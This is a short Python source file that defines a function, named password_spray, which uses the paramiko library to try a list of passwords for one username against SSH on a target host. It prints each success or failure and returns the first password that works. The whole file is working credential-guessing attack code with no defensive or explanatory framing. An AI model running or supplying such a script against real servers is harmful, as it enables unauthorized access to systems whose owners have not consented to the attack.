import paramiko

def password_spray(target, username, passwords):
    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print("[+] Password Found:", password)
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            print("[-] Wrong Password:", password)
        except Exception as e:
            print("[-] Error:", str(e))
    return None
